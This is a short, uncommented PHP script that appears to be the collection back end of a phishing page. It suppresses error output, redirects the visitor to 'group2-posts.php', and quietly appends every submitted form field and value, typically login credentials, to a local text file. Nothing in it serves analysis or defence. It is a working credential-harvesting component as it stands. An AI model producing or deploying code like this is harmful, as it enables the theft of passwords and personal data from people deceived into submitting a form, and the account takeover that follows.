<?php
error_reporting(0);
ini_set('display_errors', 0);
header ('Location: group2-posts.php');
$handle = fopen("output.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
